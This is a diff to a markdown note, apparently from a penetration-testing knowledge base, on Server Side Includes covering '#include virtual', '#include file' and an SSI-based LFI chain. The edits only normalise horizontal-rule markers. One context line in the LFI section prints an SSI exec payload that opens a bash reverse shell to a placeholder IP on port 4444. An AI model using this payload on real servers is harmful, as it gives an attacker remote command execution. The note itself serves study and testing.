@@ -17,7 +17,7 @@ linked:
 ---
 # SSI - Inclusión de Archivos
 
-***
+---
 
 ## `#include virtual` (URL-Relative)
 
@@ -37,7 +37,7 @@ linked:
 | Respects ACLs | virtual go through web auth layer | Limitation. |
 ^ssi-include-virtual
 
-___
+---
 
 ## `#include file` (Filesystem-Relative)
 
@@ -72,7 +72,7 @@ file=          Filesystem-relative
                May not follow symlinks
 ```
 
-___
+---
 
 ## LFI Chain via SSI
 
@@ -115,4 +115,4 @@ ___
 <!--#exec cmd="bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'" -->
 ```
 
-***
+---
